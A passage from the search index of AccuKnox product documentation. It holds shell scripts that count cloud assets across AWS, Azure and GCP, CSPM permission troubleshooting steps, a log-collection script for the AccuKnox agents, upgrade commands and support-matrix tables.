is 73\nRoute table in the region : us-east-2 is 5\nNetwork ACL in the region : us-east-2 is 3\n\n\nAssets in the Region: us-west-1\n\n\nEc2 instances in Region: us-west-1 is 0\nElastic Block Storage in Region: us-west-1 is 0\nVPC in Region: us-west-1 is 1\nRDS in Region: us-west-1 is 0\nLambda Functions in Region: us-west-1 is 0\nEc2 Network Interfaces in Region: us-west-1 is 0\nSubnets in the Region: us-west-1 is 2\nNetwork Load Balancers in Region: us-west-1 is 0\nKMS Key in the region: us-west-1 is 7\nECS Clusters across region : us-west-1 is 0\nEKS Clusters across region : us-west-1 is 0\nVPC Peering in the region : us-west-1 is 0\nElastic Cache Clusters in the region : us-west-1 is 0\nRDS Clusters in the region : us-west-1 is 0\nElastic IP in the region : us-west-1 is 0\nSecurity Groups in the region : us-west-1 is 1\nRoute table in the region : us-west-1 is 1\nNetwork ACL in the region : us-west-1 is 1\nAssets in the Region: us-west-2\nEc2 instances in Region: us-west-2 is 5\nElastic Block Storage in Region: us-west-2 is 50\nVPC in Region: us-west-2 is 4\nRDS in Region: us-west-2 is 0\nLambda Functions in Region: us-west-2 is 0\nEc2 Network Interfaces in Region: us-west-2 is 34\nSubnets in the Region: us-west-2 is 19\nNetwork Load Balancers in Region: us-west-2 is 1\nKMS Key in the region: us-west-2 is 14\nECS Clusters across region : us-west-2 is 0\nEKS Clusters across region : us-west-2 is 1\nVPC Peering in the region : us-west-2 is 0\nElastic Cache Clusters in the region : us-west-2 is 0\nRDS Clusters in the region : us-west-2 is 0\nElastic IP in the region : us-west-2 is 2\nSecurity Groups in the region : us-west-2 is 23\nRoute table in the region : us-west-2 is 10\nNetwork ACL in the region : us-west-2 is 4\n\n\ns3 buckets in the account is 285\n\n\nIAM users in the account is 362\n\n\nIAM Groups in the account is 11\n\n\nIAM Roles in the account is 133\n\n\nTotal Assets in this AWS account is : 1653\n</code></pre>"},{"location":"resources/count-assets/#prerequisites_1","title":"Prerequisites","text":"<ol> <li>Resource-graph extension for azure-cli</li> <li>JQ should be installed</li> </ol>"},{"location":"resources/count-assets/#bash-script-to-get-assets-count","title":"Bash script to get Assets Count","text":"<pre><code>#!/bin/bash\nX1=$(az graph query -q \"resources| where type=~ 'Microsoft.Compute/disks'| count\" | jq -r '.data[].Count')\nX2=$(az graph query -q \"resources| where type=~ 'Microsoft.Compute/virtualMachines'| count\" | jq -r '.data[].Count')\nX3=$(az graph query -q \"resources| where type=~ 'Microsoft.ContainerService/managedClusters'| count\" | jq -r '.data[].Count')\nX4=$(az graph query -q \"resources| where type=~ 'Microsoft.Network/loadBalancers'| count\" | jq -r '.data[].Count')\nX5=$(az graph query -q \"resources| where type=~ 'Microsoft.Network/networkInterfaces'| count\" | jq -r '.data[].Count')\nX6=$(az graph query -q \"resources| where type=~ 'Microsoft.Network/publicIPAddresses'| count\" | jq -r '.data[].Count')\nX7=$(az graph query -q \"resources| where type=~ 'Microsoft.Network/routeTables'| count\" | jq -r '.data[].Count')\nX8=$(az graph query -q \"resources| where type=~ 'Microsoft.Network/virtualNetworks'| count\" | jq -r '.data[].Count')\nX9=$(az graph query -q \"resources| where type == 'microsoft.network/virtualnetworks'| extend subnets = properties.subnets| mv-expand subnets| project name, subnets.name, subnets.properties.addressPrefix, location, resourceGroup, subscriptionId| count\" | jq -r '.data[].Count')\n(( SUM=X1+X2+X3+X4+X5+X6+X7+X8+X9 ))\necho \"Compute Disk = $X1\"\necho \"Virtual Machines = $X2\"\necho \"Managed Clusters = $X3\"\necho \"Load Balancers = $X4\"\necho \"Network Interfaces = $X5\"\necho \"Public IP Addresses = $X6\"\necho \"Route Tables = $X7\"\necho \"Virtual Networks = $X8\"\necho \"Subnets = $X9\"\necho \"Total No. of Assets in your azure account is $SUM\"\n</code></pre>"},{"location":"resources/count-assets/#sample-output_1","title":"Sample Output","text":""},{"location":"resources/count-assets/#assets-count_1","title":"Assets count","text":"<p>compute.Subnetwork: --asset-types=compute.googleapis.com/Subnetwork</p> <pre><code>gcloud asset search-all-resources --project=hopeful-vine-383309 --asset-types=compute.googleapis.com/Subnetwork --format='value(name)' | sort -u | find /c /v \" \"\n</code></pre> <p>compute.Route: --asset-types=compute.googleapis.com/Route</p> <pre><code>gcloud asset search-all-resources --project=hopeful-vine-383309 --asset-types=compute.googleapis.com/Route --format='value(name)' | sort -u | find /c /v \" \"\n</code></pre> <p>compute.Firewall: --asset-types=compute.googleapis.com/Firewall</p> <pre><code>gcloud asset search-all-resources --project=hopeful-vine-383309 --asset-types=compute.googleapis.com/Firewall --format='value(name)' | sort -u | find /c /v \" \"\n</code></pre> <p>logging.LogBucket: --asset-types=logging.googleapis.com/LogBucket</p> <pre><code>gcloud asset search-all-resources --project=hopeful-vine-383309 --asset-types=logging.googleapis.com/LogBucket --format='value(name)' | sort -u | find /c /v \" \"\n</code></pre> <p>serviceusage.Service: --asset-types=serviceusage.googleapis.com/Service</p> <pre><code>gcloud asset search-all-resources --project=hopeful-vine-383309 --asset-types=serviceusage.googleapis.com/Service --format='value(name)' | sort -u | find /c /v \" \"\n</code></pre>"},{"location":"resources/count-assets/#bash-script-to-get-assets-count_1","title":"Bash script to get Assets Count","text":"<pre><code>#!/bin/bash\nVar1=$(gcloud asset search-all-resources --project=hopeful-vine-383309 --asset-types=compute.googleapis.com/Subnetwork --format='value(name)' | sort -u | wc -l)\nVar2=$(gcloud asset search-all-resources --project=hopeful-vine-383309 --asset-types=compute.googleapis.com/Route --format='value(name)' | sort -u | wc -l)\nVar3=$(gcloud asset search-all-resources --project=hopeful-vine-383309 --asset-types=compute.googleapis.com/Firewall --format='value(name)' | sort -u | wc -l)\nVar4=$(gcloud asset search-all-resources --project=hopeful-vine-383309 --asset-types=logging.googleapis.com/LogBucket --format='value(name)' | sort -u | wc -l)\nVar5=$(gcloud asset search-all-resources --project=hopeful-vine-383309 --asset-types=serviceusage.googleapis.com/Service --format='value(name)' | sort -u | wc -l)\n(( SUM=Var1+Var2+Var3+Var4+Var5 ))\necho \"Total number of Assets in your GCP account is $SUM\"\n</code></pre>"},{"location":"resources/count-assets/#sample-output_2","title":"Sample Output","text":""},{"location":"resources/count-nodes/","title":"Count Nodes in Kubernetes Cluster","text":"<p>To get the kubernetes node count from your cluster you should use the following command:</p> <pre><code>kubectl get nodes --no-headers=true | wc -l\n</code></pre>"},{"location":"resources/count-registry/","title":"Count Images in Registry","text":"DockerHub <p>To get the count of dockerhub images please use the following the command after connecting your dockerhub repository to the commandline using dockerdesktop application.</p> <pre><code>docker images &lt;repository-name&gt;\n</code></pre> <p>Note: Replace the &lt;repository-name&gt; with your repository name.</p> AWS ECR <p>To get the count of the ECR Repository images the users need to connect the AWS account using AWS CLI and use the following command for getting the image count in each repository</p> <pre><code>aws ecr describe-images --repository-name &lt;repository-name&gt; --query \"length(imageDetails[])\"\n</code></pre> <p>Note: Replace the &lt;repository-name&gt; with your repository name.</p> GCR <p>To get the count of images stored in the GCR registry using the gcloud command line tool use the following command</p> <pre><code>gcloud container images list-tags gcr.io/&lt;PROJECT_ID&gt;/&lt;REPOSITORY_NAME&gt; --format='get(digest)' | wc -l\n</code></pre> <p>Note: Replace the &lt;PROJECT_ID&gt; with your Google Cloud project ID and &lt;REPOSITORY_NAME&gt; with the name of the GCR repository you want to count images.</p> ACR <p>To get the count of images stored in an Azure Container Registry (ACR) using Azure CLI use the following command</p> <pre><code>az acr repository show-tags --name &lt;ACR_NAME&gt; --repository &lt;REPOSITORY_NAME&gt; --output json --query \"length(@)\"\n</code></pre> <p>Note: Replace &lt;ACR_NAME&gt; with the name of your Azure Container Registry and &lt;REPOSITORY_NAME&gt; with the name of the ACR repository you want to count images</p>"},{"location":"resources/cspm-troubleshooting/","title":"CSPM Troubleshooting Guide","text":"<p>This guide helps troubleshoot onboarding and scanning issues for the Accuknox CNAPP SaaS deployment across AWS, Azure, and GCP.</p>"},{"location":"resources/cspm-troubleshooting/#step-1-validate-prerequisites","title":"Step 1: Validate Prerequisites","text":"<p>Ensure the required permissions are granted to the user or application for the respective cloud account.</p>"},{"location":"resources/cspm-troubleshooting/#aws-permissions","title":"AWS Permissions","text":"<ol> <li> <p>Login to AWS Console.</p> </li> <li> <p>Navigate to IAM &gt; Users.</p> </li> <li> <p>Select the user created for AccuKnox onboarding.</p> </li> </ol> <p></p> <ol> <li> <p>Go to the Permissions tab:</p> <ul> <li> <p>Confirm the following policies are attached:</p> <ul> <li> <p><code>ReadOnlyAccess</code> (AWS Managed - Job Function)</p> </li> <li> <p><code>SecurityAudit</code> (AWS Managed - Job Function)</p> </li> </ul> </li> </ul> </li> </ol> <p></p>"},{"location":"resources/cspm-troubleshooting/#azure-permissions","title":"Azure Permissions","text":"<ol> <li> <p>Login to Azure Portal.</p> </li> <li> <p>Navigate to App Registrations:</p> <ul> <li> <p>Select the application registered for onboarding.</p> </li> <li> <p>Go to the API Permissions tab and verify:</p> <ul> <li><code>Directory.Read.All</code> is listed under Application Permissions.</li> </ul> </li> </ul> </li> </ol> <p></p> <ol> <li> <p>Navigate to Subscriptions:</p> <ul> <li> <p>Select the relevant subscription.</p> </li> <li> <p>Go to Manage &gt; Access control (IAM).</p> </li> <li> <p>Verify the registered application has the following roles assigned:</p> <ul> <li> <p><code>Security Reader</code> (Job Function Role for subscriptions)</p> </li> <li> <p><code>Log Analytics Reader</code> (Job Function Role for subscriptions)</p> </li> </ul> </li> </ul> </li> </ol> <p></p>"},{"location":"resources/cspm-troubleshooting/#gcp-permissions","title":"GCP Permissions","text":"<ol> <li> <p>Login to Google Cloud Console.</p> </li> <li> <p>Navigate to IAM &amp; Admin &gt; IAM:</p> <ul> <li> <p>Find the service account created for onboarding.</p> </li> <li> <p>Verify the following roles are assigned:</p> <ul> <li> <p><code>roles/viewer</code> (Viewer Role)</p> </li> <li> <p><code>roles/iam.securityReviewer</code> (Security Reviewer Role)</p> </li> <li> <p><code>roles/logging.viewer</code> (Log Viewer Role)</p> </li> </ul> </li> </ul> </li> <li> <p>Navigate to APIs &amp; Services &gt; Library:</p> <ul> <li> <p>Ensure the following APIs are enabled:</p> <ol> <li> <p>Compute Engine API</p> </li> <li> <p>Identity and Access Management (IAM) API</p> </li> <li> <p>Cloud Resource Manager API</p> </li> <li> <p>Cloud Functions API</p> </li> <li> <p>KMS API</p> </li> <li> <p>Kubernetes API</p> </li> <li> <p>Cloud SQL Admin API</p> </li> </ol> </li> </ul> </li> </ol> <p></p> <p>If permissions and APIs are configured correctly, proceed to the next step.</p> <p>Refer to the prerequisites for more info:</p> <ul> <li> <p>AWS Onboarding Prerequisites</p> </li> <li> <p>Azure Onboarding Prerequisites</p> </li> <li> <p>GCP Onboarding Prerequisites</p> </li> </ul>"},{"location":"resources/cspm-troubleshooting/#step-2-verify-cloud-scan-status","title":"Step 2: Verify Cloud Scan Status","text":"<ol> <li> <p>Log in to the AccuKnox SaaS platform.</p> </li> <li> <p>Navigate to Settings &gt; Cloud Account.</p> </li> <li> <p>Select the specific cloud account in question.</p> </li> <li> <p>Review the status of the cloud scan:</p> </li> </ol> <p></p>"},{"location":"resources/glossary/","title":"CWPP Report Glossary","text":""},{"location":"resources/glossary/#cwpp-report-glossary","title":"CWPP Report Glossary","text":"<p>Workloads Protected:  Refers to the no. of workloads where the policies are applied</p> <p>Too many policy violations: Count of workload which has more than 100 unique policy violation</p> <p>List of workload with no protection: Shows list of workloads where there is no policy applied</p> <p>List of workload with policy violation:  Shows list of workload where policy violation has occurred and alerts have been generated for applied policies</p> <p>SCHEDULE DEMO</p>"},{"location":"resources/scan-data-backup/","title":"Customer Data Backup Guide","text":"<p>Accuknox, as a CNAPP, conducts vulnerability scans across Cloud environments, software development lifecycles, and runtime security assessments. These scans are securely saved through AccuKnox as an integral part of their SAAS package. The data is stored via AccuKnox-managed S3 buckets, which have a predefined retention policy of one month.</p> <p>However, users have the option to opt for an alternative storage solution by transferring the data to their own S3 buckets and configuring their own data retention policies. To facilitate this, users can follow the steps below:</p>"},{"location":"resources/scan-data-backup/#1backup-scan-results","title":"1.Backup scan results","text":"<p>Change the S3 bucket that is integrated with your tenant to your own S3 bucket</p> <p>Step 1.1 Access the Integration section within the Settings menu.</p> <p></p> <p>Step 1.2 Proceed to the Data Source settings.</p> <p></p> <p>Step 1.3 Select the current integration, and modify the associated S3 bucket by updating the name, access ID, and access key.</p> <p></p> <p>From this point forward, all scan files generated by the security scanning tools will be directed to the S3 bucket that the user has integrated. Consequently, the static scan data is now securely backed up and stored by the user.</p>"},{"location":"resources/scan-data-backup/#2backup-logs-and-alerts","title":"2.Backup Logs and Alerts","text":"<p>Next, we will explore how users can back up runtime alerts and logs:</p> <p>Step 2.1 Access the \"Monitor and Logging \u2192 Logs\" section.</p> <p></p> <p>Step 2.2 Choose the desired timeframe for data backup.</p> <p></p> <p>Step 2.3 Specify the preferred format, and the download process will commence automatically.</p> <p></p> <p>Step 2.4 You can now store and backup the data in the manner that suits your preferences.</p> <p></p> <p>By following the above steps, the user is capable of backing up their own data from the AccuKnox SaaS platform.</p> <p>SCHEDULE DEMO</p>"},{"location":"resources/technical-support-guide/","title":"Technical Support Guide","text":"<p>DOWNLOAD TECHNICAL GUIDE</p>"},{"location":"resources/ticket-procedure/","title":"Raise a Jira ITSM Support Ticket","text":"<p>By following these steps, you can quickly and effectively raise a Jira ITSM support ticket for major platform issues, ensuring that your problem is addressed promptly and efficiently.</p>"},{"location":"resources/ticket-procedure/#how-to-raise-an-accuknox-support-ticket","title":"How to raise an AccuKnox support ticket?","text":"<p>Step 1: Please click the following URL for raising the ticket: https://accu-knox.atlassian.net/servicedesk/customer/portal/1</p> <p>Step 2: The page will ask for you to input the mail ID for signup</p> <p></p> <p>Step 3: After giving the email ID and selecting next will ask the user to sign in with a password</p> <p></p> <p>Step 4: Once users click the sign up with password, they will get an email for setting the password to the registered email id.</p> <p></p> <p>Step 5: After clicking the link and setting up the password and username login into the customer portal again https://accu-knox.atlassian.net/servicedesk/customer/portal/1</p> <p></p> <p>Step 6: Click on the Submit a request or incident option to create the issue</p> <p></p> <p>Step 7: To create an issue fill out this form and click send. Once it is clicked, the issue is created, and you will get a confirmation email to your registered email ID.</p> <p></p>"},{"location":"resources/ticket-procedure/#how-to-track-the-issue-resolution-status","title":"How to track the issue resolution status?","text":"<p>To track the issue raised by the user they can log into the customer service portal using the link https://accu-knox.atlassian.net/servicedesk/customer/portal/1</p> <p>Step 1: Click on the requests section in the top left corner of the screen</p> <p></p> <p>Step 2: Here you will find the list of issues created by the user and their status</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"resources/troubleshooting/","title":"CWPP Troubleshooting","text":"<p>If the user faces any issue related to clusters, then they should provide the logs information of their clusters for troubleshooting purposes.</p>"},{"location":"resources/troubleshooting/#requirements","title":"Requirements","text":""},{"location":"resources/troubleshooting/#getting-kubearmor-sysdump","title":"Getting Kubearmor Sysdump","text":"<p>Users can get the kubeArmor sysdump by using the following command:</p> <pre><code>karmor sysdump\n</code></pre>"},{"location":"resources/troubleshooting/#getting-logs-from-accuknox-agents","title":"Getting logs from AccuKnox Agents","text":"<p>Along with KubeArmor Sysdump users will be required to send the logs of AccuKnox Agents running inside their cluster. To get the logs of each agent use the following commands:</p> <pre><code>kubectl logs -n accuknox-agents discovery-engine-xxxx-xxxx &gt; discovery-engine-logs.txt\nkubectl logs -n accuknox-agents feeder-service-xxxx-xxx &gt; feeder-service-logs.txt\nkubectl logs -n accuknox-agents policy-enforcement-agent-xxxx-xxx &gt; PEA-logs.txt\nkubectl logs -n accuknox-agents shared-informer-agent-XXX-XXx &gt; SIA-logs.txt\n</code></pre> <p>Note: In the above command replace the xxx-xxxx with your respective pod name that is running in accuknox-agents namespace.</p> <p>The users will have to send this Karmor sysdump file and AccuKnox Agents logs to AccuKnox Solutions team for debugging the issue.</p>"},{"location":"resources/troubleshooting/#script-to-automate-this-process","title":"Script To automate this process","text":"<ul> <li>This script will save all the output Txt files in a single zip file</li> <li>karmor sysdump will run independently as it creates a separate zip file on it\u2019s own</li> </ul> <pre><code>#!/bin/bash\n\n# Function to get the pod name for a given deployment\nget_pod_name() {\n    local namespace=$1\n    local deployment=$2\n    kubectl get po -n \"$namespace\" -o=name | grep \"$deployment\" | awk -F/ '{print $2}'\n}\n\n# Function to fetch logs for a given pod and save them to a file\nfetch_and_save_logs() {\n    local namespace=$1\n    local pod=$2\n    local output_file=$3\n    kubectl logs -n \"$namespace\" \"$pod\" &gt; \"$output_file\"\n}\n\n# Main script starts here\n\n# Set your desired namespace here\nnamespace=\"accuknox-agents\"\n\n# Get the pod names and store them in variables\ndiscovery_engine_pod=$(get_pod_name \"$namespace\" \"discovery-engine\")\nfeeder_service_pod=$(get_pod_name \"$namespace\" \"feeder-service\")\npea_pod=$(get_pod_name \"$namespace\" \"policy-enforcement-agent\")\nsia_pod=$(get_pod_name \"$namespace\" \"shared-informer-agent\")\n\n# Create a temporary directory to store the log files\ntemp_dir=$(mktemp -d 2&gt;/dev/null || mktemp -d -t 'mytmpdir')\n\n# Fetch and save the logs to separate files in the temporary directory\nfetch_and_save_logs \"$namespace\" \"$discovery_engine_pod\" \"$temp_dir/discovery-engine-logs.txt\"\nfetch_and_save_logs \"$namespace\" \"$feeder_service_pod\" \"$temp_dir/feeder-service-logs.txt\"\nfetch_and_save_logs \"$namespace\" \"$pea_pod\" \"$temp_dir/PEA-logs.txt\"\nfetch_and_save_logs \"$namespace\" \"$sia_pod\" \"$temp_dir/SIA-logs.txt\"\n\n# Create a ZIP archive of all the log files\nzip_file=\"agents_logs_archive.zip\"\nzip -j \"$zip_file\" \"$temp_dir\"/*.txt\n\n# Clean up the temporary directory\nrm -rf \"$temp_dir\"\n\necho \"Logs have been fetched and saved to the ZIP archive: $zip_file\"\n\n# Execute 'karmor sysdump'\nkarmor sysdump\n\necho \"karmor sysdump executed.\"\n</code></pre> <p>Users can now send the zip files generated for troubleshooting.</p> <p>Note: Need to install zip as a pre-requisite in linux before running the above script.</p> <pre><code>sudo apt install zip\n</code></pre>"},{"location":"resources/troubleshooting/#output","title":"Output","text":"<p>SCHEDULE DEMO</p>"},{"location":"resources/upgrade-ak-agents/","title":"Upgrading AccuKnox Agents","text":"<p>To check for the current version of the accuknox-agents chart deployed, please execute the following command:</p> <pre><code>helm list -n accuknox-agents\n</code></pre> <p>Sample Output:</p> <pre><code>~$ helm list -n accuknox-agents\nNAME            NAMESPACE       REVISION        UPDATED                                 STATUS          CHART                   APP VERSION\naccuknox-agents accuknox-agents 1               2023-09-14 15:31:56.378824112 +0530 IST deployed        accuknox-agents-v0.1.5  v0.1.5\n</code></pre> <p>If the output of the command shows the version as lower than 2.6 then it will be necessary to upgrade to the latest version.</p> <p>The following command can be used for performing the upgrade:</p> <pre><code>helm upgrade --install accuknox-agents oci://public.ecr.aws/k9v9d5v2/accuknox-agents --version \"v0.2.6\" -n accuknox-agents\n</code></pre> <p>SCHEDULE DEMO</p>"},{"location":"support-matrix/","title":"Support Matrix","text":"<p>CI/CD Support Matrix</p> <p>CSPM Assets Support</p> <p>AI/ML Support Matrix</p> <p>Compliance Matrix</p> <p>VMs</p> <p>Private Cloud</p> <p>Public Cloud</p> <p>Registry</p> <p>IaC</p> <p>KubeArmor Support Matrix</p>"},{"location":"support-matrix/aiml-support-matrix/","title":"AI/ML Security Support Matrix","text":"<p>Here's a list of of the AI/ML security features supported by AccuKnox. It outlines the various AI/ML frameworks, libraries, and tools that are compatible with AccuKnox's security solutions, ensuring that users can effectively secure their AI/ML workloads.</p> <p>Useful Links</p> <ul> <li>For onboarding refer to the AI/ML Onboarding Guide</li> <li>For use cases refer to the AI/ML Security Use Cases</li> </ul> <p></p>"},{"location":"support-matrix/aiml-support-matrix/#on-prem-llm-onboarding","title":"On-Prem LLM Onboarding","text":""},{"location":"support-matrix/aiml-support-matrix/#ml-static-scan-model-scanning","title":"ML Static Scan / Model Scanning","text":""},{"location":"support-matrix/aiml-support-matrix/#modeldataset-scan-via-collectors","title":"Model/Dataset Scan via Collectors","text":""},{"location":"support-matrix/assets-list/","title":"CSPM Assets Support","text":""},{"location":"support-matrix/assets-list/#cspm-assets-support","title":"CSPM Assets Support","text":"Category AWS Azure GCP Cloud Account <code>aws_account</code> <code>azure_subscription</code> <code>gcp_project</code> IAM <code>aws_iam_user</code>, <code>aws_iam_role</code>, <code>aws_iam_group</code>, <code>aws_accessanalyzer_analyzer</code>, <code>aws_cognito_identity_pool</code>, <code>aws_cognito_identity_provider</code>, <code>aws_cognito_user_pool</code>, <code>aws_iam_policy</code> <code>azure_role_assignment</code> <code>gcp_iam_policy</code>, <code>gcp_iam_role</code>, <code>gcp_service_account</code>, <code>gcp_secret_manager_secret</code>, <code>gcp_service_account_key</code> Security Monitoring <code>aws_accessanalyzer_finding</code> <code>azure_log_alert</code> - Certificate Management <code>aws_acm_certificate</code>, <code>aws_acmpca_certificate_authority</code> - - Serverless <code>aws_amplify_app</code>, <code>aws_lambda_function</code>, <code>aws_redshiftserverless_namespace</code>, <code>aws_redshiftserverless_workgroup</code> <code>azure_app_configuration</code>, <code>azure_app_service_environment</code>, <code>azure_app_service_function_app</code>, <code>azure_app_service_plan</code>, <code>azure_app_service_web_app</code>, <code>azure_app_service_web_app_slot</code> - API Management <code>aws_api_gateway_authorizer</code>, <code>aws_api_gateway_rest_api</code>, <code>aws_api_gateway_domain_name</code>, <code>aws_api_gateway_stage</code>, <code>aws_api_gateway_usage_plan</code>, <code>aws_api_gatewayv2_api</code>, <code>aws_api_gatewayv2_domain_name</code>, <code>aws_api_gatewayv2_integration</code>, <code>aws_api_gatewayv2_route</code>, <code>aws_api_gatewayv2_stage</code> <code>azure_api_management</code> <code>gcp_apikeys_key</code> Backup &amp; Disaster Recovery <code>aws_backup_job</code>, <code>aws_backup_plan</code>, <code>aws_backup_recovery_point</code>, <code>aws_backup_selection</code>, <code>aws_backup_vault</code>, <code>aws_drs_job</code>, <code>aws_drs_recovery_instance</code>, <code>aws_drs_recovery_snapshot</code>, <code>aws_drs_source_server</code>, <code>aws_dynamodb_backup</code> <code>azure_recovery_services_vault</code> - Deployment <code>aws_cloudformation_stack</code>, <code>aws_cloudformation_stack_resource</code>, <code>aws_cloudformation_stack_set</code> - - CDN <code>aws_cloudfront_cache_policy</code>, <code>aws_cloudfront_distribution</code>, <code>aws_cloudfront_function</code>, <code>aws_cloudfront_origin_request_policy</code>, <code>aws_cloudfront_response_headers_policy</code>, <code>aws_cloudsearch_domain</code> - - Audit Logging <code>aws_cloudtrail_channel</code>, <code>aws_cloudtrail_trail</code> - <code>gcp_logging_bucket</code>, <code>gcp_logging_sink</code> CodeArtifact <code>aws_codeartifact_domain</code>, <code>aws_codeartifact_repository</code> - - CI/CD <code>aws_codebuild_build</code>, <code>aws_codebuild_project</code>, <code>aws_codebuild_source_credential</code>, <code>aws_codecommit_repository</code>, <code>aws_codedeploy_app</code>, <code>aws_codedeploy_deployment_config</code>, <code>aws_codedeploy_deployment_group</code>, <code>aws_codepipeline_pipeline</code> - - Miscellaneous <code>aws_config_aggregate_authorization</code>, <code>aws_config_configuration_recorder</code>, <code>aws_dlm_lifecycle_policy</code>, <code>aws_ec2_launch_configuration</code>, <code>aws_ec2_launch_template</code>, <code>aws_ec2_launch_template_version</code>, <code>aws_ec2_managed_prefix_list</code>, <code>aws_redshift_event_subscription</code> <code>azure_search_service</code>, <code>azure_servicebus_namespace</code>, <code>azure_spring_cloud_service</code>, <code>azure_stream_analytics_job</code> - Cluster <code>aws_dax_cluster</code>, <code>aws_ecs_cluster</code>, <code>aws_eks_cluster</code>, <code>aws_elasticache_cluster</code> <code>azure_kubernetes_cluster</code> <code>gcp_kubernetes_cluster</code> Networking <code>aws_dax_subnet_group</code>, <code>aws_ec2_application_load_balancer</code>, <code>aws_ec2_classic_load_balancer</code>, <code>aws_ec2_gateway_load_balancer</code>, <code>aws_ec2_load_balancer_listener</code>, <code>aws_ec2_network_interface</code>, <code>aws_ec2_network_load_balancer</code>, <code>aws_ec2_target_group</code>, <code>aws_ec2_transit_gateway</code>, <code>aws_ec2_transit_gateway_route</code>, <code>aws_ec2_transit_gateway_route_table</code>, <code>aws_ec2_transit_gateway_vpc_attachment</code>, <code>aws_elasticache_subnet_group</code>, <code>aws_rds_db_proxy</code>, <code>aws_rds_db_subnet_group</code>, <code>aws_route53_domain</code>, <code>aws_route53_zone</code>, <code>aws_s3_access_point</code>, <code>aws_vpc</code>, <code>aws_vpc_subnet</code>, <code>aws_vpc_eip</code>, <code>aws_vpc_nat_gateway</code>, <code>aws_vpc_security_group</code>, <code>aws_vpc_security_group_rule</code>, <code>aws_vpc_network_acl</code>, <code>aws_vpc_route</code>, <code>aws_vpc_route_table</code> <code>azure_network_interface</code>, <code>azure_virtual_network</code>, <code>azure_subnet</code>, <code>azure_public_ip</code>, <code>azure_network_security_group</code>, <code>azure_application_security_group</code>, <code>azure_lb</code>, <code>azure_route_table</code>, <code>azure_application_gateway</code>, <code>azure_dns_zone</code>, <code>azure_eventgrid_domain</code>, <code>azure_eventgrid_topic</code>, <code>azure_eventhub_namespace</code>, <code>azure_express_route_circuit</code>, <code>azure_firewall</code>, <code>azure_firewall_policy</code>, <code>azure_lb_nat_rule</code>, <code>azure_lb_outbound_rule</code>, <code>azure_lb_probe</code>, <code>azure_lb_rule</code>, <code>azure_nat_gateway</code>, <code>azure_network_watcher</code>, <code>azure_private_dns_zone</code>, <code>azure_signalr_service</code>, <code>azure_virtual_network_gateway</code> <code>gcp_compute_firewall</code>, <code>gcp_compute_forwarding_rule</code>, <code>gcp_compute_global_address</code>, <code>gcp_compute_snapshot</code>, <code>gcp_compute_network</code>, <code>gcp_compute_subnetwork</code> Data Analytics <code>aws_dms_replication_instance</code> - <code>gcp_pubsub_snapshot</code>, <code>gcp_pubsub_subscription</code>, <code>gcp_pubsub_topic</code> DocumentDB <code>aws_docdb_cluster</code>, <code>aws_docdb_cluster_instance</code>, <code>aws_docdb_cluster_snapshot</code> - - Database <code>aws_dynamodb_global_table</code>, <code>aws_dynamodb_table</code>, <code>aws_rds_db_cluster</code>, <code>aws_rds_db_instance</code>, <code>aws_redshift_cluster</code>, <code>aws_redshift_snapshot</code>, <code>aws_redshift_subnet_group</code> <code>azure_redis_cache</code>, <code>azure_sql_database</code>, <code>azure_sql_server</code>, <code>azure_mssql_elasticpool</code>, <code>azure_mssql_managed_instance</code>, <code>azure_mysql_flexible_server</code>, <code>azure_mysql_server</code>, <code>azure_postgresql_flexible_server</code>, <code>azure_postgresql_server</code>, <code>azure_storage_account</code>, <code>azure_storage_table</code> <code>gcp_bigquery_dataset</code>, <code>gcp_bigtable_instance</code>, <code>gcp_sql_backup</code>, <code>gcp_sql_database</code>, <code>gcp_sql_database_instance</code> Block Storage <code>aws_ebs_volume</code>, <code>aws_ebs_snapshot</code> <code>azure_compute_disk</code>, <code>azure_hpc_cache</code> <code>gcp_compute_disk</code> Compute <code>aws_ec2_ami</code>, <code>aws_ec2_autoscaling_group</code>, <code>aws_ec2_capacity_reservation</code>, <code>aws_ec2_reserved_instance</code> <code>azure_batch_account</code>, <code>azure_cognitive_account</code>, <code>azure_compute_availability_set</code>, <code>azure_compute_disk_access</code>, <code>azure_compute_disk_encryption_set</code>, <code>azure_compute_snapshot</code>, <code>azure_compute_ssh_key</code>, <code>azure_compute_virtual_machine_scale_set</code>, <code>azure_compute_virtual_machine_scale_set_vm</code> <code>gcp_compute_address</code>, <code>gcp_compute_autoscaler</code>, <code>gcp_compute_instance_group</code>, <code>gcp_compute_instance_template</code>, <code>gcp_compute_node_group</code>, <code>gcp_compute_node_template</code>, <code>gcp_compute_target_pool</code> Host <code>aws_ec2_instance</code>, <code>aws_ec2_instance_availability</code> <code>azure_compute_virtual_machine</code>, <code>azure_bastion_host</code> <code>gcp_compute_instance</code> Key Management <code>aws_ec2_key_pair</code>, <code>aws_kms_key</code> <code>azure_key_vault</code>, <code>azure_key_vault_key</code>, <code>azure_key_vault_key_version</code>, <code>azure_key_vault_managed_hardware_security_module</code> - Object Storage <code>aws_s3_bucket</code> <code>azure_storage_container</code>, <code>azure_storage_blob_service</code> <code>gcp_storage_bucket</code> AI + Machine Learning <code>aws_sagemaker_app</code>, <code>aws_sagemaker_domain</code> <code>azure_databricks_workspace</code>, <code>azure_machine_learning_workspace</code> <code>gcp_vertex_ai_model</code>, <code>gcp_vertex_ai_endpoint</code> Developer Tools <code>aws_ses_email_identity</code>, <code>aws_sns_topic</code>, <code>aws_sns_subscription</code>, <code>aws_sqs_queue</code> - - Workspace <code>aws_workspaces_workspace</code> - - Operations - <code>azure_application_insight</code> - Automation - <code>azure_automation_account</code>, <code>azure_automation_variable</code> - Containers - <code>azure_container_group</code>, <code>azure_container_registry</code> <code>gcp_artifact_registry_repository</code> Pipeline - <code>azure_data_factory_pipeline</code> - IOT - <code>azure_iothub</code> - Analytics - <code>azure_kusto_cluster</code> - Management - <code>azure_maintenance_configuration</code>, <code>azure_management_lock</code>, <code>azure_tenant</code> - Miscellaneous - <code>azure_search_service</code>, <code>azure_servicebus_namespace</code>, <code>azure_spring_cloud_service</code>, <code>azure_stream_analytics</code> - <p>SCHEDULE DEMO</p>"},{"location":"support-matrix/cicd-support-matrix/","title":"CI/CD Support Matrix","text":""},{"location":"support-matrix/cicd-support-matrix/#cicd-support-matrix","title":"CI/CD Support Matrix","text":"<p>Azure DevOps</p> <p>Google Cloud Build</p> <p>Harness</p> <p>Jenkins</p> <p>AWS Code Pipeline</p> <p>GitHub</p> <p>Gitlab</p> <p>Bitbucket</p> <p>Checkmarx</p> <p>CI/CD Support Matrix provides a structured overview of supported capabilities and integration types across popular CI/CD platforms. This helps teams align their DevOps processes with available tools and identify the best fit for their workflows.</p> 